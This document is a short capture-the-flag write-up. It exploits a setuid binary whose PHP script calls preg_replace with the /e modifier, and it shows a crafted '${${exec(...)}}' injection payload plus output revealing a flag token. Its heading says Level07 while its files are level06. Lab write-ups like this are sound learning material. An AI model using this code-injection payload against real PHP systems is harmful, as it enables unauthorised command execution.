# Level07

```bash
ls -la

-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06 # it does have suid permissions
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

the php script does read a file content, and use regex to replace it with new txt<br/>
The content of the script
```php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
The script read the content of the passed file argument and do some regex to replace its content<br/>
We notice that the script use preg_replace which use the `/e` modifier on the regular expression/pattern<br/>
The `/e` modifier allows a second argument to be evaluated as a PHP expression<br/>
So let's exploit this by injecting our command in the passed argument

With the help of the regex any comes in this format `[x test]` will be replaced with this one `y(test)` 

```bash

echo '[x ${${exec(getflag)}}]' > /tmp/flag

./level06 /tmp/flag # [x ${${exec(getflag)}}] --> y(${${exec(getflag)}}) which will excute exec with arg getflag, does gives us the token

PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable:  in /home/user/level06/level06.php(4) : regexp code on line 1
```